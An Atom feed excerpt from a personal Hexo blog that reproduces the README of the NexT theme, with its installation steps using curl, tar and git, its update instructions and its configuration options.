target="_blank" rel="noopener">开发历史 Changelog</a></h2><!--[lic-image]: https://img.shields.io/npm/l/hexo-theme-next.svg-->]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p align=&quot;right&quot;&gt;&lt;a title=&quot;New «NexT» 6.0.0 version [Reloaded]&quot; href=&quot;https://github.com/theme-next/hexo-theme-next&quot; target=&quot;_blank&quot;</summary>
        
      
    
    
    
    <category term="NexT" scheme="https://kabeor.github.io/categories/NexT/"/>
    
    
    <category term="README" scheme="https://kabeor.github.io/tags/README/"/>
    
    <category term="NexT" scheme="https://kabeor.github.io/tags/NexT/"/>
    
  </entry>
  
  <entry>
    <title>NexT README</title>
    <link href="https://kabeor.github.io/README/"/>
    <id>https://kabeor.github.io/README/</id>
    <published>2018-01-31T16:00:00.000Z</published>
    <updated>2020-03-16T04:48:54.142Z</updated>
    
    <content type="html"><![CDATA[<p align="right"><a title="New «NexT» 6.0.0 version [Reloaded]" href="https://github.com/theme-next/hexo-theme-next" target="_blank" rel="noopener">NexT v6.0.0 here :triangular_flag_on_post:</a></p><h1 align="center">NexT</h1><p align="center">NexT is a high quality elegant <a href="http://hexo.io" target="_blank" rel="noopener">Hexo</a> theme. It is crafted from scratch, with love.</p><p><a href="https://gitter.im/iissnan/hexo-theme-next?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge" target="_blank" rel="noopener"><img alt="gitter-image" data-src="https://badges.gitter.im/Join%20Chat.svg" class="lazyload"></a><br><a href="https://github.com/theme-next/hexo-theme-next" target="_blank" rel="noopener"><img alt="mnt-image" data-src="https://img.shields.io/maintenance/yes/2017.svg" class="lazyload"></a><br><a href="https://travis-ci.org/iissnan/hexo-theme-next?branch=master" target="_blank" rel="noopener" title="Travis CI"><img alt="travis-image" data-src="https://travis-ci.org/iissnan/hexo-theme-next.svg?branch=master" class="lazyload"></a><br><a href="https://github.com/iissnan/hexo-theme-next/releases" target="_blank" rel="noopener"><img alt="rel-image" data-src="https://img.shields.io/github/release/iissnan/hexo-theme-next.svg" class="lazyload"></a><br><a href="http://hexo.io" target="_blank" rel="noopener"><img alt="hexo-image" data-src="https://img.shields.io/badge/hexo-%3E%3D%203.0-blue.svg" class="lazyload"></a><br><a href="LICENSE"><img alt="lic-image" data-src="https://img.shields.io/dub/l/vibe-d.svg" class="lazyload"></a></p><ul><li><a href="README.cn.md">Chinese Documentation</a></li></ul><h2 id="Live-Preview"><a href="#Live-Preview" class="headerlink" title="Live Preview"></a>Live Preview</h2><ul><li>:heart_decoration: Muse scheme: <a href="https://leaferx.online" target="_blank" rel="noopener">LEAFERx</a> | <a href="https://notes.wanghao.work" target="_blank" rel="noopener">XiaMo</a> | <a href="https://oawan.me" target="_blank" rel="noopener">OAwan</a></li><li>:six_pointed_star: Mist scheme: <a href="https://blog.zzbd.org" target="_blank" rel="noopener">Jeff</a> | <a href="http://uchuhimo.me" target="_blank" rel="noopener">uchuhimo</a> | <a href="http://www.ixirong.com" target="_blank" rel="noopener">xirong</a></li><li>:pisces: Pisces scheme: <a href="http://notes.iissnan.com" target="_blank" rel="noopener">Vi</a> | <a href="https://acris.me" target="_blank" rel="noopener">Acris</a> | <a href="https://rainylog.com" target="_blank" rel="noopener">Rainy</a></li><li>:gemini: Gemini scheme: <a href="https://almostover.ru" target="_blank" rel="noopener">Ivan.Nginx</a> | <a href="http://sh.alynx.xyz" target="_blank" rel="noopener">Alynx</a> | <a href="https://raincal.top" target="_blank" rel="noopener">Raincal</a></li></ul><p>More NexT examples <a href="https://github.com/iissnan/hexo-theme-next/issues/119" target="_blank" rel="noopener">here</a>.</p><h2 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h2><p><strong>1.</strong> Change dir to <strong>hexo root</strong> directory. There must be <code>node_modules</code>, <code>source</code>, <code>themes</code> and other directories:<br>   <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sh</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> hexo</span><br><span class="line">$ ls</span><br><span class="line">_config.yml  node_modules  package.json  public  scaffolds  <span class="built_in">source</span>  themes</span><br></pre></td></tr></table></figure></div></p><p><strong>2.</strong> Get theme from GitHub. There are several variants to do it:</p><h3 id="Download-latest-release-version"><a href="#Download-latest-release-version" class="headerlink" title="Download latest release version."></a>Download <a href="https://github.com/iissnan/hexo-theme-next/releases/latest" target="_blank" rel="noopener">latest release version</a>.</h3><p>   At most cases <strong>stable</strong>. Recommended for most users.</p><p>   <a href="http://lmgtfy.com/?q=linux+curl+tar+wget+install" target="_blank" rel="noopener"><img alt="curl-tar-wget-image" data-src="https://img.shields.io/badge/install%20with%20-curl%20%7C%20tar%20%7C%20wget-blue.svg" class="lazyload"></a></p>   <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sh</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ mkdir themes/next</span><br><span class="line">$ curl -s https://api.github.com/repos/iissnan/hexo-theme-next/releases/latest | grep tarball_url | cut -d <span class="string">'"'</span> -f 4 | wget -i - -O- | tar -zx -C themes/next --strip-components=1</span><br></pre></td></tr></table></figure></div><h3 id="Download-tagged-release-version"><a href="#Download-tagged-release-version" class="headerlink" title="Download tagged release version."></a>Download <a href="https://github.com/iissnan/hexo-theme-next/releases" target="_blank" rel="noopener">tagged release version</a>.</h3><p>   You must define version. Replace <code>v5.1.2</code> with any version from <a href="https://github.com/iissnan/hexo-theme-next/tags" target="_blank" rel="noopener">tags list</a>.</p><p>   <a href="http://lmgtfy.com/?q=linux+curl+tar+install" target="_blank" rel="noopener"><img alt="curl-tar-image" data-src="https://img.shields.io/badge/install%20with%20-curl%20%7C%20tar-blue.svg" class="lazyload"></a></p>   <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sh</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ mkdir themes/next</span><br><span class="line">$ curl -L https://api.github.com/repos/iissnan/hexo-theme-next/tarball/v5.1.2 | tar -zxv -C themes/next --strip-components=1</span><br></pre></td></tr></table></figure></div><p>   <a href="http://lmgtfy.com/?q=linux+git+install" target="_blank" rel="noopener"><img alt="git-image" data-src="https://img.shields.io/badge/install%20with%20-git-blue.svg" class="lazyload"></a></p>   <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sh</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> --branch v5.1.2 https://github.com/iissnan/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure></div><h3 id="Download-latest-master-branch"><a href="#Download-latest-master-branch" class="headerlink" title="Download latest master branch."></a>Download <a href="https://github.com/iissnan/hexo-theme-next/archive/master.zip" target="_blank" rel="noopener">latest master branch</a>.</h3><p>   May be <strong>unstable</strong>, but includes latest features. Recommended for developers.</p><p>   <a href="http://lmgtfy.com/?q=linux+curl+tar+install" target="_blank" rel="noopener"><img alt="curl-tar-image" data-src="https://img.shields.io/badge/install%20with%20-curl%20%7C%20tar-blue.svg" class="lazyload"></a></p>   <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sh</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ mkdir themes/next</span><br><span class="line">$ curl -L https://api.github.com/repos/iissnan/hexo-theme-next/tarball | tar -zxv -C themes/next --strip-components=1</span><br></pre></td></tr></table></figure></div><p>   <a href="http://lmgtfy.com/?q=linux+git+install" target="_blank" rel="noopener"><img alt="git-image" data-src="https://img.shields.io/badge/install%20with%20-git-blue.svg" class="lazyload"></a></p>   <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sh</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/iissnan/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure></div><p>   Clone command will give you the <strong>whole repository</strong>. And in any time you can switch to any tagged release.<br>   Get tags list:</p>   <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sh</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> themes/next</span><br><span class="line">$ git tag -l</span><br><span class="line">…</span><br><span class="line">v5.0.0</span><br><span class="line">v5.0.1</span><br><span class="line">v5.1.0</span><br><span class="line">v5.1.1</span><br><span class="line">v5.1.2</span><br></pre></td></tr></table></figure></div><p>   For example, you want to switch on <code>v5.1.0</code> <a href="https://github.com/iissnan/hexo-theme-next/tags" target="_blank" rel="noopener">tagged release version</a>. Input the following command:</p>   <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sh</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git checkout tags/v5.1.0</span><br><span class="line">Note: checking out <span class="string">'tags/v5.1.0'</span>.</span><br><span class="line">…</span><br><span class="line">HEAD now on 1f72f68... CSS: Remove global list-style setting of ul</span><br></pre></td></tr></table></figure></div><p>   And if you want to switch back on <a href="https://github.com/iissnan/hexo-theme-next/commits/master" target="_blank" rel="noopener">master branch</a>, input this command:</p>   <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sh</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git checkout master</span><br></pre></td></tr></table></figure></div><p><strong>3.</strong> Set theme in main <strong>hexo root config</strong> <code>_config.yml</code> file:</p><pre><code>theme: next</code></pre><h3 id="Bugs"><a href="#Bugs" class="headerlink" title="Bugs"></a>Bugs</h3><p>For those who also encounter <strong>Error: Cannot find module ‘hexo-util’</strong> <a href="https://github.com/iissnan/hexo-theme-next/issues/1490" target="_blank" rel="noopener">issue</a>, please check your NPM version.</p><ul><li><code>&gt; 3</code>: Still not work. Please remove <code>node_modules</code> directory and reinstall using <code>npm install</code>.</li><li><code>&lt; 3</code>: Please add <code>hexo-util</code> explicitly via <code>npm install --save-dev hexo-util</code> to you site package deps.</li></ul><h2 id="Update"><a href="#Update" class="headerlink" title="Update"></a>Update</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sh</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> themes/next</span><br><span class="line">$ git pull</span><br></pre></td></tr></table></figure></div><h3 id="Bugs-1"><a href="#Bugs-1" class="headerlink" title="Bugs"></a>Bugs</h3><blockquote><p>Commit your changes or stash them before you can merge</p></blockquote><p>You must Commit, Stash or Discard local changes. See <a href="https://stackoverflow.com/a/15745424/5861495" target="_blank" rel="noopener">here</a> how to do it.</p><h3 id="Theme-configurations-using-Hexo-data-files-328"><a href="#Theme-configurations-using-Hexo-data-files-328" class="headerlink" title="Theme configurations using Hexo data files (#328)"></a>Theme configurations using Hexo data files (<a href="https://github.com/iissnan/hexo-theme-next/issues/328" target="_blank" rel="noopener">#328</a>)</h3><p>Currently, it is not smooth to update NexT theme from pulling or downloading new releases. It is quite often running into conflict status when updating NexT theme via <code>git pull</code>, or need to merge configurations manually when upgrading to new releases.</p><p> At present, NexT encourages users to store some options in site’s <code>_config.yml</code> and other options in theme’s <code>_config.yml</code>. This approach is applicable, but has some drawbacks:</p><ol><li>Configurations are splited into two pieces</li><li>Users maybe confuse which place should be for options</li></ol><p>In order to resolve this issue, NexT will take advantage of Hexo <a href="https://hexo.io/docs/data-files.html" target="_blank" rel="noopener">Data files</a>. Because Data files is introduced in Hexo 3, so you need upgrade Hexo to 3.0 (or above) to use this feature.</p><p>If you prefer Hexo 2.x, you can still use the old approach for configurations. NexT is still compatible with Hexo 2.x.</p><h4 id="Benefits"><a href="#Benefits" class="headerlink" title="Benefits"></a>Benefits</h4><p>With this feature, now you can put all your configurations into one place (<code>source/_data/next.yml</code>), you don’t need to touch <code>next/_config.yml</code>. If there are any new options in new releases, you just need to copy those options from <code>next/_config.yml</code>, paste into <code>_data/next.yml</code> and set their values to whatever you want.</p><h4 id="How-to-use-this-feature"><a href="#How-to-use-this-feature" class="headerlink" title="How to use this feature"></a>How to use this feature</h4><ol><li>Please ensure you are using Hexo 3 (or above)</li><li>Create an file named <code>next.yml</code> in site’s <code>source/_data</code> directory (create <code>_data</code> directory if it did not exist)</li><li>Copy NexT theme options both in site’s <code>_config.yml</code> and theme’s <code>_config.yml</code> into <code>next.yml</code>.</li><li>Use <code>--config source/_data/next.yml</code> parameter to start server, generate or deploy.<br>For example: <code>hexo clean --config source/_data/next.yml &amp;&amp; hexo g --config source/_data/next.yml</code>.</li></ol><h2 id="Features"><a href="#Features" class="headerlink" title="Features"></a>Features</h2><h3 id="Multiple-languages-support-including"><a href="#Multiple-languages-support-including" class="headerlink" title="Multiple languages support, including:"></a>Multiple languages support, including:</h3><p>:cn: Simplified Chinese &amp; Traditional Chinese.<br><br>:us: English<br><br>:ru: Russian<br><br>:fr: French<br><br>:de: German<br><br>:jp: Japanese<br><br>:indonesia: Indonesian<br><br>:portugal: Portuguese (Brazil)<br><br>:kr: Korean<br><br>:it: Italian<br><br>:netherlands: Dutch<br><br>:vietnam: Vietnamese</p><p>Default language is English.</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">yml</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">language:</span> <span class="string">en</span></span><br><span class="line"><span class="comment"># language: zh-Hans</span></span><br><span class="line"><span class="comment"># language: zh-hk</span></span><br><span class="line"><span class="comment"># language: zh-tw</span></span><br><span class="line"><span class="comment"># language: ru</span></span><br><span class="line"><span class="comment"># language: fr-FR</span></span><br><span class="line"><span class="comment"># language: de</span></span><br><span class="line"><span class="comment"># language: ja</span></span><br><span class="line"><span class="comment"># language: id</span></span><br><span class="line"><span class="comment"># language: pt</span></span><br><span class="line"><span class="comment"># language: pt-BR</span></span><br><span class="line"><span class="comment"># language: ko</span></span><br><span class="line"><span class="comment"># language: it</span></span><br><span class="line"><span class="comment"># language: nl-NL</span></span><br><span class="line"><span class="comment"># language: vi</span></span><br></pre></td></tr></table></figure></div><p>Set <code>language</code> field as following in site <code>_config.yml</code> to change to Chinese.</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">yml</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">language:</span> <span class="string">zh-Hans</span></span><br></pre></td></tr></table></figure></div><h3 id="Comment-support"><a href="#Comment-support" class="headerlink" title="Comment support."></a>Comment support.</h3><p>NexT has native support for <code>DuoShuo</code> and <code>Disqus</code> comment systems.</p><p>Add the following snippets to your <code>_config.yml</code>:</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">yml</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">duoshuo:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">shortname:</span> <span class="string">your-duoshuo-shortname</span></span><br></pre></td></tr></table></figure></div><p>OR</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">yml</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">disqus_shortname:</span> <span class="string">your-disqus-shortname</span></span><br></pre></td></tr></table></figure></div><h3 id="Tags-page"><a href="#Tags-page" class="headerlink" title="Tags page."></a>Tags page.</h3><blockquote><p>Add a tags page contains all tags in your site.</p></blockquote><ul><li><p>Create a page named <code>tags</code></p><pre><code>hexo new page &quot;tags&quot;</code></pre></li><li><p>Edit tags page, set page type to <code>tags</code>.</p><pre><code>title: All tagsdate: 2014-12-22 12:39:04type: &quot;tags&quot;</code></pre></li><li><p>Add <code>tags</code> to theme <code>_config.yml</code>:</p><pre><code>menu:  home: /  archives: /archives  tags: /tags</code></pre></li></ul><h3 id="Categories-page"><a href="#Categories-page" class="headerlink" title="Categories page."></a>Categories page.</h3><blockquote><p>Add a categories page contains all categories in your site.</p></blockquote><ul><li><p>Create a page named <code>categories</code></p><pre><code>hexo new page &quot;categories&quot;</code></pre></li><li><p>Edit categories page, set page type to <code>categories</code>.</p><pre><code>title: All categoriesdate: 2014-12-22 12:39:04type: &quot;categories&quot;</code></pre></li><li><p>Add <code>categories</code> to theme <code>_config.yml</code>:</p><pre><code>menu:  home: /  archives: /archives  categories: /categories</code></pre></li></ul><h3 id="Social-Media"><a href="#Social-Media" class="headerlink" title="Social Media"></a>Social Media</h3><p>NexT can automatically add links to your Social Media accounts:</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">yml</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">social:</span></span><br><span class="line">  <span class="attr">GitHub:</span> <span class="string">your-github-url</span></span><br><span class="line">  <span class="attr">Twitter:</span> <span class="string">your-twitter-url</span></span><br><span class="line">  <span class="attr">Weibo:</span> <span class="string">your-weibo-url</span></span><br><span class="line">  <span class="attr">DouBan:</span> <span class="string">your-douban-url</span></span><br><span class="line">  <span class="attr">ZhiHu:</span> <span class="string">your-zhihu-url</span></span><br></pre></td></tr></table></figure></div><h3 id="Feed-link"><a href="#Feed-link" class="headerlink" title="Feed link."></a>Feed link.</h3><blockquote><p>Show a feed link.</p></blockquote><p>Set <code>rss</code> field in theme’s <code>_config.yml</code>, as the following value:</p><ol><li><p><code>rss: false</code> will totally disable feed link.</p></li><li><p><code>rss:</code> use sites’ feed link. This is the default option.</p><p> Follow the installation instruction in the plugin’s README. After the configuration is done for this plugin, the feed link is ready too.</p></li><li><p><code>rss: http://your-feed-url</code> set specific feed link.</p></li></ol><h3 id="Up-to-5-code-highlight-themes-built-in"><a href="#Up-to-5-code-highlight-themes-built-in" class="headerlink" title="Up to 5 code highlight themes built-in."></a>Up to 5 code highlight themes built-in.</h3><p>NexT uses <a href="https://github.com/chriskempson/tomorrow-theme" target="_blank" rel="noopener">Tomorrow Theme</a> with 5 themes for you to choose from.<br>Next use <code>normal</code> by default. Have a preview about <code>normal</code> and <code>night</code>:</p><p><a href="http://iissnan.com/nexus/next/tomorrow-normal.png" data-fancybox="group" data-caption="Tomorrow Normal Preview" class="fancybox"><img alt="Tomorrow Normal Preview" title="Tomorrow Normal Preview" data-src="http://iissnan.com/nexus/next/tomorrow-normal.png" class="lazyload"></a><br><a href="http://iissnan.com/nexus/next/tomorrow-night.png" data-fancybox="group" data-caption="Tomorrow Night Preview" class="fancybox"><img alt="Tomorrow Night Preview" title="Tomorrow Night Preview" data-src="http://iissnan.com/nexus/next/tomorrow-night.png" class="lazyload"></a></p><p>Head over to <a href="https://github.com/chriskempson/tomorrow-theme" target="_blank" rel="noopener">Tomorrow Theme</a> for more details.</p><h2 id="Configuration"><a href="#Configuration" class="headerlink" title="Configuration"></a>Configuration</h2><p>NexT comes with few configurations.</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">yml</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># Menu configuration.</span></span><br><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">home:</span> <span class="string">/</span></span><br><span class="line">  <span class="attr">archives:</span> <span class="string">/archives</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Favicon</span></span><br><span class="line"><span class="attr">favicon:</span> <span class="string">/favicon.ico</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Avatar (put the image into next/source/images/)</span></span><br><span class="line"><span class="comment"># can be any image format supported by web browsers (JPEG,PNG,GIF,SVG,..)</span></span><br><span class="line"><span class="attr">avatar:</span> <span class="string">/default_avatar.png</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Code highlight theme</span></span><br><span class="line"><span class="comment"># available: normal | night | night eighties | night blue | night bright</span></span><br><span class="line"><span class="attr">highlight_theme:</span> <span class="string">normal</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Fancybox for image gallery</span></span><br><span class="line"><span class="attr">fancybox:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Specify the date when the site was setup</span></span><br><span class="line"><span class="attr">since:</span> <span class="number">2013</span></span><br></pre></td></tr></table></figure></div><h2 id="Browser-support"><a href="#Browser-support" class="headerlink" title="Browser support"></a>Browser support</h2><p><a href="https://img.shields.io/badge/browser-%20chrome%20%7C%20firefox%20%7C%20opera%20%7C%20safari%20%7C%20ie%20%3E%3D%209-lightgrey.svg" data-fancybox="group" data-caption="browser-image" class="fancybox"><img alt="browser-image" title="browser-image" data-src="https://img.shields.io/badge/browser-%20chrome%20%7C%20firefox%20%7C%20opera%20%7C%20safari%20%7C%20ie%20%3E%3D%209-lightgrey.svg" class="lazyload"></a></p><p><a href="https://www.browserstack.com/" target="_blank" rel="noopener"><img alt="Browser Stack" data-src=".github/browserstack_logo.png" class="lazyload"></a></p><blockquote><p><strong>BrowserStack</strong> is a cloud-based cross-browser testing tool that enables developers to test their websites across various browsers on different operating systems and mobile devices, without requiring users to install virtual machines, devices or emulators.</p></blockquote><h2 id="Contributing"><a href="#Contributing" class="headerlink" title="Contributing"></a>Contributing</h2><p>Contribution is welcome, feel free to open an issue and fork. Waiting for your pull request.</p><!--[![hexo-image]][hexo-url][![bower-image]][bower-url][![jquery-image]][jquery-url][hexo-image]: http://img.shields.io/badge/Hexo-2.4+-2BAF2B.svg?style=flat-square[hexo-url]: http://hexo.io[bower-image]: http://img.shields.io/badge/Bower-*-2BAF2B.svg?style=flat-square[bower-url]: http://bower.io[jquery-image]: https://img.shields.io/badge/jquery-1.9-blue.svg?style=flat-square[jquery-url]: http://jquery.com/--><!--[lic-image]: https://img.shields.io/npm/l/hexo-theme-next.svg-->]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p align=&quot;right&quot;&gt;&lt;a title=&quot;New «NexT» 6.0.0 version [Reloaded]&quot; href=&quot;https://github.com/theme-next/hexo-theme-next&quot; target=&quot;_blank&quot;</summary>
        
      
    
    
    
    <category term="NexT" scheme="https://kabeor.github.io/categories/NexT/"/>
    
    
    <category term="README" scheme="https://kabeor.github.io/tags/README/"/>
    
    <category term="NexT" scheme="https://kabeor.github.io/tags/NexT/"/>
    
  </entry>
  
</feed>
